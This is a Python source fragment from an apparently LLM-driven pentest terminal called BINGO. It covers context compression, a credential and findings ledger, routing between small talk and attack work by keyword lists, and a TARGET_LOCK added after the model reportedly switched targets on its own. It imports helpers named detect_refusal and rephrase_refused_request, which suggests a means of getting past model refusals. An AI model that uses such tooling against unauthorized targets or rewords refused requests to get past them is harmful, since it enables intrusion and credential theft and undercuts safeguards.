        for m_input in _html_re.finditer(r'<input\b[^>]*>', content, _html_re.I):
            tag = m_input.group(0)
            name_m = _html_re.search(r'\bname\s*=\s*["\']?([^"\'\s>]+)', tag, _html_re.I)
            type_m = _html_re.search(r'\btype\s*=\s*["\']?([^"\'\s>]+)', tag, _html_re.I)
            if name_m:
                name = name_m.group(1)[:80]
                typ = type_m.group(1)[:30] if type_m else "?"
                item = f"{name}:{typ}"
                if item not in inputs:
                    inputs.append(item)
        hrefs = []
        for m_href in _html_re.finditer(r'\bhref\s*=\s*["\']([^"\']+)', content, _html_re.I):
            href = m_href.group(1).strip()
            if href and href not in hrefs:
                hrefs.append(href[:180])
            if len(hrefs) >= 20:
                break
        scripts = []
        for m_src in _html_re.finditer(r'\bsrc\s*=\s*["\']([^"\']+)', content, _html_re.I):
            src = m_src.group(1).strip()
            if src and src not in scripts:
                scripts.append(src[:180])
            if len(scripts) >= 12:
                break
        params = sorted(set(_html_re.findall(r'[?&]([A-Za-z_][A-Za-z0-9_]{0,40})=', content)))[:40]
        lines = ["[HTML_SUMMARY]"]
        if status:
            lines.append(f"- status: {status}")
        if title:
            lines.append(f"- title: {title}")
        lines.append(f"- forms: {len(forms)}")
        if inputs:
            lines.append("- inputs: " + ", ".join(inputs[:40]))
        if params:
            lines.append("- params: " + ", ".join(params))
        if hrefs:
            lines.append("- hrefs: " + " | ".join(hrefs[:12]))
        if scripts:
            lines.append("- scripts: " + " | ".join(scripts[:8]))
        return "\n".join(lines)

    @staticmethod
    def _select_evidence_lines(content: str, max_lines: int = 90) -> list[str]:
        """Keep attack-relevant lines from large logs/tool output."""
        import re as _line_re

        lines = content.splitlines()
        keep_patterns = _line_re.compile(
            r'HTTP/|STATUS|SIZE|LEN|elapsed|timeout|ReadTimeout|Traceback|'
            r'SyntaxError|NameError|exit_code|TRUE|FALSE|diff=|baseline|threshold|'
            r'SQLI_|XSS_|LFI|RCE|SSRF|IDOR|WAF|BLOCK|blocked|forbidden|406|403|'
            r'BINGO-|confirmed|probable|potential|quarantined|oracle|payload|'
            r'url=|URL:|https?://|param|parameter|bo_table|wr_id|mb_id|'
            r'Cookie|Set-Cookie|PHPSESSID|csrf|token|hidden|input|form|Location|'
            r'Server:|Content-Type|title|script|href|admin|login|auth|redirect',
            _line_re.I,
        )
        selected: list[str] = []
        for line in lines[:12]:
            stripped = line.strip()
            if stripped:
                selected.append(stripped[:500])
        for line in lines:
            stripped = line.strip()
            if stripped and keep_patterns.search(stripped):
                selected.append(stripped[:700])
            if len(selected) >= max_lines:
                break
        if len(selected) < max_lines:
            for line in lines[-12:]:
                stripped = line.strip()
                if stripped:
                    selected.append(stripped[:500])
        deduped: list[str] = []
        seen: set[str] = set()
        for line in selected:
            if line not in seen:
                deduped.append(line)
                seen.add(line)
            if len(deduped) >= max_lines:
                break
        return deduped

    def _compress_message_for_model_context(self, msg: Message, index: int, total: int) -> Message:
        """Compress only the copy sent to the model; never mutates history."""
        if msg.role == "system":
            return msg
        content = msg.content or ""
        if not content:
            return msg
        protect_last = self._token_governor_int("BINGO_TOKEN_GOVERNOR_PROTECT_LAST", 4)
        soft_limit = self._token_governor_int("BINGO_TOKEN_GOVERNOR_SOFT_CHARS", 6000)
        hard_limit = self._token_governor_int("BINGO_TOKEN_GOVERNOR_HARD_CHARS", 14000)
        is_recent = index >= max(0, total - protect_last)
        limit = hard_limit if is_recent else soft_limit
        if len(content) <= limit:
            return msg
        # Do not trim very recent skill payloads unless they are extreme; skills
        # affect attack behavior. Older duplicates can be summarized normally.
        if is_recent and "=== SKILL CONTENT INJECTED" in content and len(content) <= hard_limit * 2:
            return msg

        html_digest = self._html_context_digest(content)
        evidence_lines = self._select_evidence_lines(content)
        omitted = max(0, len(content) - sum(len(line) for line in evidence_lines))
        header = (
            "[TOKEN_GOVERNOR_COMPRESSED_CONTEXT]\n"
            f"- original_chars: {len(content)}\n"
            f"- est_original_tokens: {self._estimate_context_tokens(content)}\n"
            f"- omitted_chars_approx: {omitted}\n"
            "- rule: original output is preserved in session/logs; this is model-input compression only.\n"
        )
        body_parts = [header]
        if html_digest:
            body_parts.append(html_digest)
        if evidence_lines:
            body_parts.append("[EVIDENCE_LINES]\n" + "\n".join(evidence_lines))
        compressed = "\n\n".join(body_parts)
        if len(compressed) > limit:
            compressed = compressed[:limit] + "\n...[token governor clipped model-copy context]..."
        return Message(role=msg.role, content=compressed)

    def _build_token_governor_ledger(self) -> Message | None:
        """Short evidence ledger injected into model context when compression is active."""
        try:
            state = getattr(self, "_agent_state", {}) or {}
            lines = ["[BINGO_EVIDENCE_LEDGER]"]
            target = state.get("target") or getattr(self.config, "target", "") or "unknown"
            lines.append(f"- target: {target}")
            for key in ("waf", "db_name", "confirmed_sqli"):
                if state.get(key) not in (None, "", [], {}):
                    lines.append(f"- {key}: {state.get(key)}")
            if state.get("tables"):
                lines.append(f"- tables: {state.get('tables')[:20]}")
            creds = BingoTerminal._filter_verified_report_credentials(state.get("credentials", []))
            if creds:
                lines.append(f"- verified_credentials: {creds[:5]}")
            fe = getattr(self, "_findings_exporter", None)
            if fe is not None:
                if hasattr(fe, "summary"):
                    summary = fe.summary()
                    if summary:
                        lines.append(f"- findings_summary: {summary}")
                if hasattr(fe, "ground_truth_block"):
                    gt = fe.ground_truth_block()
                    if gt:
                        lines.append("[FINDINGS_GROUND_TRUTH]\n" + gt[:3000])
            last_ctx = getattr(self, "_last_execution_context", None)
            if isinstance(last_ctx, dict):
                lines.append(
                    "- last_execution: "
                    f"source={last_ctx.get('source')} scripts={len(last_ctx.get('scripts', []))} "
                    f"response_bytes={last_ctx.get('response_bytes')}"
                )
            return Message(role="user", content="\n".join(lines)[:5000])
        except Exception:
            return None

    def _apply_token_governor(self, history: list[Message]) -> list[Message]:
        """Reduce model-input tokens without changing execution/history state."""
        if not self._token_governor_enabled():
            return history
        max_total = self._token_governor_int("BINGO_TOKEN_GOVERNOR_MAX_CHARS", 50000)
        compressed = [
            self._compress_message_for_model_context(msg, idx, len(history))
            for idx, msg in enumerate(history)
        ]
        # If still too large, keep all messages but clamp older long model-copy
        # bodies harder.  Latest messages remain protected by the first pass.
        total_chars = sum(len(m.content or "") for m in compressed)
        if total_chars > max_total:
            tightened: list[Message] = []
            for idx, msg in enumerate(compressed):
                if idx < max(0, len(compressed) - 6) and len(msg.content) > 3000:
                    tightened.append(Message(
                        role=msg.role,
                        content=msg.content[:3000] + "\n...[token governor global budget clip]...",
                    ))
                else:
                    tightened.append(msg)
            compressed = tightened
        self._last_token_governor_stats = {
            "original_chars": sum(len(m.content or "") for m in history),
            "model_chars": sum(len(m.content or "") for m in compressed),
            "messages": len(history),
        }
        return compressed

    def _build_messages(self, skill_context: str = "") -> list[Message]:
        """시스템 프롬프트 + 스킬 컨텍스트 + 대화 히스토리 합치기.
        history 안에 dict가 섞여 있어도 자동으로 Message 로 변환한다.

        v6.2.151: 2-pass Compaction — 히스토리가 임계값을 초과하면
        오래된 메시지를 배경 LLM 요약으로 압축하여 컨텍스트 창 효율을 높임.
        (bingo 자체 설계: Pass1 배경 요약 + Pass2 히스토리 교체)
        """
        safe_history: list[Message] = []
        for m in self.history:
            if isinstance(m, Message):
                safe_history.append(m)
            elif isinstance(m, dict):
                role = m.get("role", "user")
                content = m.get("content", "")
                if role in ("user", "assistant", "system") and content:
                    safe_history.append(Message(role=role, content=content))
        self.history = safe_history          # 정규화 반영

        # ── v6.2.151 2-pass Compaction (Type A) — v6.2.171 조기화 개선 ─────
        # Pass 1: 비-시스템 메시지가 임계값 초과 시 배경 LLM 요약 스케줄링
        #         트리거: 메시지 25개 초과 OR 추정 토큰 60k 초과 (이중 조건)
        # Pass 2: 요약 완성 후 오래된 히스토리를 요약문으로 교체
        #         + 보존된 최근 12개 메시지 내 대형 항목도 3000자로 클리핑
        non_system = [m for m in safe_history if m.role != "system"]

        # v6.2.171: 토큰 기반 조기 트리거 추가
        _ns_total_chars = sum(len(m.content) for m in non_system)
        _ns_est_tokens  = _ns_total_chars // 4
        _compaction_thr = getattr(self, "_compaction_threshold", 25)  # 40→25
        _token_thr      = 60_000  # 60k 토큰 초과 시 강제 압축
        if (
            (len(non_system) > _compaction_thr or _ns_est_tokens > _token_thr)
            and not getattr(self, "_compaction_running", False)
        ):
            self._trigger_background_compaction(non_system)

        if getattr(self, "_compaction_summary", ""):
            # Pass 2: 요약 완성 → 앞부분 히스토리를 요약 메시지로 교체
            _keep_recent = 12  # 10→12 (최근 조금 더 보존)
            system_msgs = [m for m in safe_history if m.role == "system"]
            non_sys = [m for m in safe_history if m.role != "system"]
            if len(non_sys) > _keep_recent:
                _lang = getattr(self.config, "lang", "en")
                _compaction_prefix = {
                    "ko": "[압축된 이전 대화 요약]\n",
                    "zh": "[已压缩的历史对话摘要]\n",
                    "en": "[Compacted history summary]\n",
                }.get(_lang, "[Compacted history]\n")
                compact_msg = Message(
                    role="assistant",
                    content=_compaction_prefix + self._compaction_summary,
                )
                # v6.2.172: 스마트 클리핑 — 가장 최신 4개는 절대 보호,
                # 그 이전 메시지만 크기 기준으로 잘라내기.
                # (방금 실행한 툴 결과가 잘려 AI가 방금 한 작업을 모르는 현상 방지)
                _recent = non_sys[-_keep_recent:]
                _PROTECT_LAST = 4   # 최신 N개는 클리핑 금지
                _CLIP_LIMIT = 3000  # 보호 대상 외 메시지 최대 길이
                _clipped = []
                for _ci, _cm in enumerate(_recent):
                    _is_protected = _ci >= len(_recent) - _PROTECT_LAST
                    if not _is_protected and len(_cm.content) > _CLIP_LIMIT:
                        _clip_note = self.s.get(
                            "context_clip_omitted",
                            "\n...[context compressed: excess omitted]...",
                        )
                        _clipped.append(Message(
                            role=_cm.role,
                            content=_cm.content[:_CLIP_LIMIT] + _clip_note
                        ))
                    else:
                        _clipped.append(_cm)
                safe_history = system_msgs + [compact_msg] + _clipped
                self.history = safe_history
                with self._compaction_lock:
                    self._compaction_summary = ""  # 소비 완료

        model_history = self._apply_token_governor(safe_history)
        ledger = self._build_token_governor_ledger() if self._token_governor_enabled() else None
        if ledger is not None:
            return [self._get_system_message(skill_context), ledger] + model_history
        return [self._get_system_message(skill_context)] + model_history

    def _trigger_background_compaction(self, non_system_msgs: list) -> None:
        """오래된 히스토리를 백그라운드 스레드에서 LLM으로 요약 (2-pass Compaction Pass 1)."""
        import threading as _ct
        if getattr(self, "_compaction_running", False):
            return
        _msgs_to_compact = non_system_msgs[:-8]  # 최근 8개는 보존
        if len(_msgs_to_compact) < 6:
            return

        def _compact_worker():
            try:
                with self._compaction_lock:
                    self._compaction_running = True

                _lang = getattr(self.config, "lang", "en")
                _compact_text = "\n".join(
                    f"[{m.role}]: {m.content[:300]}" for m in _msgs_to_compact[-20:]
                )
                _prompt_map = {
                    "ko": (
                        f"다음 침투테스트 대화를 중요 발견사항 중심으로 간결하게 요약하세요 "
                        f"(취약점, 계정, SQLi 포인트, WAF 정보, 다음 단계 포함):\n\n{_compact_text}"
                    ),
                    "zh": (
                        f"请简洁总结以下渗透测试对话，重点包括发现的漏洞、凭据、SQLi点、"
                        f"WAF信息和下一步操作：\n\n{_compact_text}"
                    ),
                    "en": (
                        f"Summarize this pentest conversation concisely, focusing on key findings "
                        f"(vulns, creds, SQLi points, WAF info, next steps):\n\n{_compact_text}"
                    ),
                }
                _compact_prompt = _prompt_map.get(_lang, _prompt_map["en"])

                from ..models.registry import ModelRegistry as _MR
                _mc = self.config.get_active_model_config()
                if not _mc:
                    return
                _m = _MR.build(_mc)
                _summ_parts = []
                for _chunk in _m.chat_stream(
                    [Message(role="user", content=_compact_prompt)]
                ):
                    if _chunk.text:
                        _summ_parts.append(_chunk.text)
                    if _chunk.done:
                        break
                _summary = "".join(_summ_parts).strip()
                if _summary:
                    with self._compaction_lock:
                        self._compaction_summary = _summary
            except Exception:
                pass
            finally:
                with self._compaction_lock:
                    self._compaction_running = False

        _ct.Thread(target=_compact_worker, daemon=True, name="bingo-compaction").start()

    # ────────────────────────────────────────────────────────────────
    # 일반 대화 감지 — 침투테스트와 무관한 질문인지 판별
    # ────────────────────────────────────────────────────────────────
    _GENERAL_TRIGGERS = (
        # 자기소개 / 모델 질문
        "무슨 모델", "어떤 모델", "모델이야", "모델이니", "모델이에요",
        "what model", "which model", "what are you", "who are you",
        "你是什么", "你是哪个", "什么模型", "哪个模型",
        # 인사
        "안녕", "반가워", "반갑습니다", "안녕하세요", "hi", "hello", "hey",
        "你好", "您好", "嗨", "哈喽",
        # 자기소개 요청
        "소개해줘", "소개해 줘", "introduce yourself",
        "자기소개", "너에 대해", "bingo가 뭐야", "bingo란", "bingo에 대해",
        "告诉我关于你", "介绍一下",
        # 기능 문의
        "뭘 할 수 있어", "뭘 할 수 있니", "무엇을 할 수 있", "어떤 기능",
        "what can you do", "your capabilities", "what do you do",
        "你能做什么", "有什么功能",
        # 감사 / 칭찬
        "고마워", "감사해", "고맙습니다", "감사합니다",
        "thank you", "thanks", "great job", "well done",
        "谢谢", "太好了", "做得好",
        # 개념 질문 (짧은 정의 요청)
        "이 뭐야", "이 뭐니", "이란 뭐야", "란 무엇", "란 뭐야",
        "what is ", "what's ", "what are ", "explain ",
        "是什么", "什么是", "解释一下",
        # 날씨·시간·잡담
        "오늘 날씨", "몇 시야", "뭐 먹을", "피곤하다", "심심하다",
        "weather", "what time", "i'm bored", "i'm tired",
        "今天天气", "几点了", "无聊",
    )
    _PENTEST_STRONG = (
        "http://", "https://", ".com", ".net", ".kr", ".cn", ".jp",
        "sqli", "sql inject", "xss", "lfi", "rce", "ssrf", "idor",
        "payload", "bypass", "shell", "exploit", "scan port",
        "해킹", "취약점 테스트", "침투", "인젝션", "스캔",
        "渗透", "注入", "漏洞", "扫描",
        # 추가 키워드: 메뉴 옵션에서 자주 등장하는 공격 관련 중국어/한국어
        # v3.2.68 버그 수정: 盲注 등 PENTEST_STRONG 미포함 키워드로 오분류 방지
        "盲注", "布尔", "爆破", "枚举", "绕过", "提权", "凭证", "数据库名",
        "webshell", "반환", "추출해", "덤프", "크랙", "브루트포스",
        "自动化", "二分法", "管理员", "session", "cookie",
    )

    # 개념 질문 접두사 — 이 패턴으로 시작하면 보안 키워드가 있어도 general로 취급
    _CONCEPT_PREFIXES = (
        "what is ", "what's ", "what are ", "explain ", "define ",
        "뭐야", "뭐니", "뭐에요", "란 무엇", "이란 뭐", "이 뭐야", "이 뭐니",
        "是什么", "什么是", "解释", "讲一下",
        "how does ", "how do ", "어떻게 작동", "어떻게 동작",
        "什么意思", "怎么工作",
    )

    def _is_general_question(self, text: str) -> bool:
        """일반 대화성 질문이면 True — 침투테스트 작업이면 False.
        
        원칙: pentest 증거가 명확할 때만 False. 나머지는 모두 general.
        """
        import re as _re
        t = text.strip().lower()

        # 1) URL 포함 → URL 단독 입력이면 무조건 pentest
        #    URL + pentest 동사 → pentest
        #    URL + 일반 질문("뭐야?", "이게 뭐야") → general
        if _re.search(r"https?://", t):
            _url_pentest_verbs = (
                "해킹", "공격", "스캔", "침투", "테스트해", "인젝션", "취약",
                "hack", "scan", "attack", "exploit", "inject", "pentest",
                "sqli", "xss", "lfi", "rce", "bypass", "shell",
                "攻击", "扫描", "渗透", "注入",
            )
            if any(kw in t for kw in _url_pentest_verbs):
                return False
            # URL 제거 후 남는 텍스트가 없으면 → URL 단독 입력 → pentest
            _text_sans_url = _re.sub(r"https?://[^\s]+", "", t).strip()
            if not _text_sans_url:
                return False  # URL만 있음 → pentest 의도로 해석
            # URL + 일반 질문 텍스트이면 general (예: "이 사이트 뭐야?")
            return True

        # 2) 강한 pentest 키워드 포함 → pentest
        #    단, 짧고 물음표로 끝나면 개념 질문 (e.g. "XSS가 뭐야?")
        if any(kw in t for kw in self._PENTEST_STRONG):
            if len(t) <= 40 and (t.endswith("?") or t.endswith("？")):
                return True
            return False

        # 3) 도메인처럼 생긴 패턴 포함 → pentest (e.g. "example.co.kr 해킹해줘")
        if _re.search(r"\b[\w-]+\.(com|net|kr|jp|cn|io|org|co)\b", t):
            return False

        # 4) pentest 명령어 패턴 → pentest (e.g. "sqlmap으로 ~", "nmap 스캔")
        _pentest_verbs = (
            "스캔해", "공격해", "해킹해", "침투해", "테스트해", "검사해",
            "인젝션", "취약점 찾", "익스플로잇", "웹쉘", "크랙",
            "scan ", "attack ", "exploit ", "inject ", "enumerate ",
            "扫描", "攻击", "渗透测试", "注入",
        )
        if any(kw in t for kw in _pentest_verbs):
            return False

        # 5) 나머지는 모두 일반 대화로 처리
        #    (인사, 잡담, 감사, 개념 질문, 짧은 대화 등)
        return True

    def _get_general_system_message(self) -> "Message":
        """일반 대화용 경량 시스템 프롬프트 반환 (침투테스트 강요 없음)."""
        import datetime
        from ..models.registry import ModelRegistry
        model_cfg = self.config.get_active_model_config()

        _lang = getattr(self.config, "lang", "en")
        _lang_label = {
            "ko": "Korean (한국어)",
            "zh": "Chinese Simplified (简体中文)",
            "en": "English",
        }.get(_lang, "English")

        _model_name = model_cfg.model if model_cfg else "unknown"
        from ..models.registry import BUILTIN_PROVIDERS, get_provider_label
        _raw_provider = model_cfg.provider if model_cfg else "unknown"
        _provider_info = BUILTIN_PROVIDERS.get(_raw_provider, {})
        # v3.2.90: label이 dict일 수 있으므로 get_provider_label() 사용
        _provider_label = get_provider_label(_provider_info, _lang) if _provider_info else _raw_provider.capitalize()
        _provider_short = _provider_label.split()[0] if _provider_label else _raw_provider.capitalize()

        # 현재 날짜/시간 — 로컬 시스템 시간 사용 (UI 언어 기준)
        _now = datetime.datetime.now()
        _weekday_ko = ["월요일", "화요일", "수요일", "목요일", "금요일", "토요일", "일요일"][_now.weekday()]
        _weekday_zh = ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期日"][_now.weekday()]
        _weekday_en = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"][_now.weekday()]
        _date_str = _now.strftime("%Y년 %m월 %d일") + f" {_weekday_ko}"
        _date_str_zh = _now.strftime("%Y年%m月%d日") + f" {_weekday_zh}"
        _date_str_en = _now.strftime("%B %d, %Y") + f" ({_weekday_en})"
        _time_str = _now.strftime("%H:%M")
        _date_primary = {
            "ko": _date_str,
            "zh": _date_str_zh,
            "en": _date_str_en,
        }.get(_lang, _date_str_en)

        system = (
            f"You are BINGO — an AI security testing terminal.\n"
            f"Your underlying AI model is: {_model_name}\n"
            f"Your AI provider is: {_provider_short}\n\n"
            f"=== CURRENT DATE & TIME (SYSTEM CLOCK) ===\n"
            f"{_date_primary} {_time_str}\n"
            f"IMPORTANT: Use ONLY these values when answering date/time questions. NEVER guess or make up dates.\n\n"
            f"=== GENERAL CONVERSATION MODE ===\n"
            f"The user has asked a general (non-pentest) question.\n"
            f"Respond naturally, helpfully, and concisely as an AI assistant.\n\n"
            f"Rules:\n"
            f"- ALWAYS respond in {_lang_label}. Every single word must be in this language.\n"
            f"- Introduce yourself as BINGO when asked (not as {_model_name} or {_provider_short} directly).\n"
            f"- If asked 'what model are you' or 'what AI are you', say: "
            f"'저는 BINGO입니다. 기반 모델은 {_model_name}이며, 제공자는 {_provider_short}입니다.' (translate to {_lang_label})\n"
            f"- NEVER say '??', 'unknown', or leave provider blank. Always use '{_provider_short}'.\n"
            f"- If asked about date/time/day, use ONLY the system clock values above. Never invent dates.\n"
            f"- If asked about your capabilities, briefly describe BINGO's pentest features.\n"
            f"- If asked a general knowledge question (what is XSS, etc.), answer clearly.\n"
            f"- Keep responses concise (3-5 lines for simple questions).\n"
            f"- Do NOT output AWAITING_BINGO_EXECUTION.\n"
            f"- Do NOT output vulnerability report format.\n"
            f"- Be friendly and human-like in tone.\n"
        )
        return Message(role="system", content=system)

    def _send_message(self, text: str, _force_pentest: bool = False) -> None:
        # 사용자 메시지 출력
        self._print_user(text)

        model_cfg = self.config.get_active_model_config()
        if not model_cfg:
            self._error(self.s["no_model_configured"])
            return

        from ..models.registry import ModelRegistry
        from ..models.system_prompt import detect_refusal, rephrase_refused_request, wrap_task
        model = ModelRegistry.build(model_cfg)

        # ── 일반 대화 모드 감지 ────────────────────────────────────────
        # _force_pentest=True: 메뉴 옵션 선택 등 명백한 침투테스트 명령은 검사 생략
        full_response = ""  # 초기화 — UnboundLocalError 방지
        if not _force_pentest and self._is_general_question(text):
            self.history.append(Message(role="user", content=text))
            self._append_to_session_log("user", text)

            # 임시로 시스템 메시지를 경량 일반대화 프롬프트로 교체
            _orig_build = self._build_messages

            def _general_build(skill_context: str = "") -> list:  # type: ignore[override]
                msgs = [{"role": "system", "content": self._get_general_system_message().content}]
                for m in self.history:
                    if m.role != "system":
                        msgs.append({"role": m.role, "content": m.content})
                return msgs

            self._build_messages = _general_build  # type: ignore[method-assign]
            full_response = self._stream_response(
                model.chat_stream(self._build_messages(""))
            )
            self._build_messages = _orig_build  # type: ignore[method-assign]
            # ★ Ctrl+C 중단 감지 — 플래그가 남아있으면 두 번째 _stream_response 호출 방지
            if self._agent_stop_flag.is_set():
                self._agent_stop_flag.clear()
                return

        if full_response:
            self.history.append(Message(role="assistant", content=full_response))
            self._append_to_session_log("assistant", full_response)
            return

        # 관련 스킬 자동 조회
        skill_context = self._get_skill_context(text)

        # URL 감지 시 실제 WAF 스캔 실행
        # 새 타겟 URL이면 agent_state 초기화 + 대화 히스토리 CMS 오염 방지
        import re as _re
        _urls = _re.findall(r"https?://[^\s\"'<>]+", text)
        # 裸域名 fallback: http(s):// 없이 입력한 경우 (예: gomdon.com.vn)
        # → 실제 연결로 https/http 자동 감지 후 target 설정
        if not _urls:
            _bare = _re.findall(
                r"(?<![.@/\w])([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9][a-zA-Z0-9\-]*)+(?:/[^\s\"'<>]*)?)",
                text,
            )
            # TLD 2자 이상 + 숫자로만 시작하는 버전(3.1.9 등) 제외
            _bare = [
                b for b in _bare
                if _re.search(r"\.[a-zA-Z]{2,}(?:[./]|$)", b) and not _re.match(r"^\d", b)
            ]
            if _bare:
                # https → http 순서로 실제 연결 시도해서 살아있는 프로토콜 선택
                _domain = _bare[0]
                self.console.print(
                    f"  [{THEME['dim']}]{self.s['proto_detecting'].format(domain=_domain)}[/]"
                )
                def _detect_proto(domain: str) -> tuple:
                    """(url, success) 반환. success=False면 fallback"""
                    import urllib.request, ssl
                    _ctx = ssl.create_default_context()
                    _ctx.check_hostname = False
                    _ctx.verify_mode = ssl.CERT_NONE
                    for _scheme in ("https", "http"):
                        try:
                            _req = urllib.request.Request(
                                f"{_scheme}://{domain}",
                                headers={"User-Agent": "Mozilla/5.0"},
                                method="HEAD",
                            )
                            urllib.request.urlopen(
                                _req, timeout=4,
                                context=_ctx if _scheme == "https" else None,
                            )
                            return (f"{_scheme}://{domain}", True)
                        except Exception:
                            continue
                    return (f"https://{domain}", False)  # 둘 다 실패 → https 기본값
                _detected, _ok = _detect_proto(_domain)
                if _ok:
                    self.console.print(
                        f"  [{THEME['success']}]{self.s['proto_detected'].format(url=_detected)}[/]"
                    )
                else:
                    self.console.print(
                        f"  [{THEME['warn']}]{self.s['proto_fallback'].format(url=_detected)}[/]"
                    )
                _urls = [_detected]
        _target_changed = False
        if _urls:
            new_target = _urls[0].rstrip("/?,")
            _existing_target = self._agent_state.get("target", "")

            # ── v4.9.0: TARGET_LOCK (2차 방어선) ───────────────────────────
            # 1차 방어: _detect_hallucination 패턴 7 — LLM 코드 내 타 도메인 URL 차단(근본 수정)
            # 2차 방어: 여기서 텍스트에서 추출한 URL이 다른 도메인이면 차단
            # 기록.md L1079: LLM이 hanurschool.nurihaus.com으로 무단 타겟 변경
            if _existing_target and new_target != _existing_target:
                # 동일 도메인 내 경로 변경은 허용 (프로토콜+도메인만 비교)
                import urllib.parse as _up
                _ex_parsed = _up.urlparse(_existing_target)
                _new_parsed = _up.urlparse(new_target)
                _ex_domain = f"{_ex_parsed.scheme}://{_ex_parsed.netloc}".lower()
                _new_domain = f"{_new_parsed.scheme}://{_new_parsed.netloc}".lower()
                if _ex_domain != _new_domain and _new_domain not in ("://", "//"):
                    # 다른 도메인 → TARGET_LOCK 발동 → 사용자에게 확인 요청
                    _lang = getattr(self.config, "lang", "en")
                    _lock_warn = {
                        "ko": (
                            f"⛔ [TARGET_LOCK v4.8.0] 타겟 무단 변경 차단!\n"
                            f"  현재 타겟: {_existing_target}\n"
                            f"  변경 시도: {new_target}\n"
                            f"  새 타겟으로 변경하려면 명시적으로 '/target {new_target}' 입력."
                        ),
                        "zh": (
                            f"⛔ [TARGET_LOCK v4.8.0] 阻止未授权目标变更!\n"
                            f"  当前目标: {_existing_target}\n"
                            f"  尝试变更为: {new_target}\n"
                            f"  如需切换目标，请明确输入 '/target {new_target}'."
                        ),
                        "en": (
                            f"⛔ [TARGET_LOCK v4.8.0] Unauthorized target change blocked!\n"
                            f"  Current target: {_existing_target}\n"
                            f"  Attempted change: {new_target}\n"
                            f"  To switch target, explicitly type '/target {new_target}'."
                        ),
                    }.get(_lang, f"⛔ [TARGET_LOCK] Blocked target change from {_existing_target} to {new_target}")
                    self.console.print(f"[bold red]{_lock_warn}[/bold red]")
                    # 타겟 변경 차단 — _urls를 비워서 이후 처리 스킵
                    _urls = []
                    new_target = _existing_target
            # ──────────────────────────────────────────────────────────────

            if _urls and self._agent_state.get("target") != new_target:
                _target_changed = True
                self._reset_agent_state()
                self._agent_state["target"] = new_target
                self._current_target = new_target
                self._exec_loop_count = 0
                self._stuck_count = 0
                self._recent_results = []
                # ── v6.2.159 Task Graph 초기화 (새 타겟 설정 시) ────────────
                if getattr(self, "_intel_ready", False):
                    try:
                        self._task_graph.load_template(text)
                        self._self_reflector._last_reflect_loop = 0
                        self._self_reflector._reflect_count = 0
                        _tg_render = self._task_graph.render()
                        if _tg_render:
                            self.console.print(f"\n[bold cyan]{_tg_render}[/bold cyan]")
                    except Exception:
                        pass
                # ─────────────────────────────────────────────────────────────
                # v6.2.102: 타겟 이탈 자동 차단기에 현재 타겟 동기화
                try:
                    from ..tools_ext.pentest_tools import set_target_domain
                    set_target_domain(new_target)
                except Exception:
                    pass

                # ── v2.9.2: 새 타겟 전환 시 대화 히스토리에서 이전 CMS/그누보드
                #    관련 메시지가 AI를 오염시키지 않도록 히스토리 트리밍
                #    (마지막 4턴만 유지하여 과거 컨텍스트 제거)
                if len(self.history) > 8:
                    self.history = self.history[-4:]

                # ── v3.2.83: 새 타깃 URL 설정 시 소스코드 경로 자동 질문 ──
                # v3.5.6: 오케스트레이터 백그라운드 스레드에서 호출 시
                #   prompt_toolkit RuntimeError("Application is already running") 방지 →
                #   메인 스레드에서만 실행
                import threading as _thr_wb
                _is_main = (_thr_wb.current_thread() is _thr_wb.main_thread())
                _src_path = ""
                if _is_main:
                    _wb_ask = self.s.get("wb_ask_path", "📂 소스코드 경로 있으면 입력 (없으면 엔터):")
                    self.console.print(f"[{THEME['primary']}]{_wb_ask}[/]", end=" ")
                    try:
                        _src_path = self._session.prompt("").strip()
                    except (EOFError, KeyboardInterrupt, RuntimeError):
                        _src_path = ""
                if _src_path:
                    import os as _os
                    _real = _os.path.expandvars(_os.path.expanduser(_src_path))
                    if _os.path.exists(_real):
                        # 화이트박스 분석 실행 → 하이브리드 모드
                        self._cmd_whitebox(f"{_real} {new_target}")
                    else:
                        self._warn(self.s.get("wb_path_not_found", "경로 없음: {path}").format(path=_real))
        waf_context = self._auto_waf_scan(text)
        burp_context = self._auto_burp_scan(text)  # [v3.2.51] Burp 자동 스캔
        # ── v2.9.2: 새 타겟 전환 시 AI에게 명시적으로 컨텍스트 리셋 알림
        if _target_changed and _urls:
            _new_target_notice = (
                "=== 🆕 NEW TARGET — FULL CONTEXT RESET (v2.9.2) ===\n"
                f"New target: {_urls[0]}\n"
                "ALL previous CMS/framework assumptions are VOID.\n"
                "CMS = COMPLETELY UNKNOWN until actual HTTP evidence is collected.\n"
                "DO NOT assume Gnuboard, XE, or any Korean CMS.\n"
                "DO NOT reference any paths (/bbs/, /xe/, /wp-admin/) without seeing them in recon.\n"
                "Start fresh: fetch homepage → analyze HTML → detect CMS from evidence only.\n"
                "=== END RESET NOTICE ===\n\n"
            )
            text = _new_target_notice + text

        # PentAGI식 XML 태스크 래핑 (보안 관련 요청만)
        _security_keywords = (
            "sqli", "sql", "inject", "waf", "bypass", "shell", "rce", "lfi",
            "admin", "db", "database", "exploit", "scan", "payload", "xss",
            "해킹", "공격", "취약", "인젝션", "우회", "침투", "스캔", "추출",
            "웹쉘", "관리자", "비밀번호", "크랙",
            # DApp/Web3/Smart Contract 키워드
            "web3", "dapp", "defi", "nft", "smart contract", "스마트 컨트랙트",
            "solidity", "blockchain", "블록체인", "이더리움", "ethereum",
            "abi", "rpc", "metamask", "walletconnect", "wagmi", "ethers",
            "reentrancy", "재진입", "flash loan", "플래시론", "oracle",
            "erc20", "erc721", "token", "토큰", "contract audit", "컨트랙트 감사",
        )
        text_lower = text.lower()
        if any(kw in text_lower for kw in _security_keywords):
            wrapped_text = wrap_task(text)
        else:
            wrapped_text = text

        # DApp/Web3 키워드 감지 시 web3 스킬 자동 주입
        _web3_keywords = (
            "web3", "dapp", "defi", "nft", "smart contract", "스마트 컨트랙트",
            "solidity", "blockchain", "블록체인", "이더리움", "ethereum",
            "abi", "metamask", "walletconnect", "wagmi", "ethers", "viem",
            "reentrancy", "재진입", "flash loan", "플래시론", "oracle",
            "erc20", "erc721", "contract audit", "컨트랙트 감사",
            "swc-", "delegatecall", "selfdestruct", "ecrecover",
        )
        if any(kw in text_lower for kw in _web3_keywords):
            try:
                from ..skills.engine import SkillEngine as _SE15
                _engine15 = _SE15()
                _web3_ctx = _engine15.local_skill_context(text, max_chars=4000)
                if _web3_ctx:
                    _lang = getattr(self.config, "lang", "en")
                    _web3_label = {
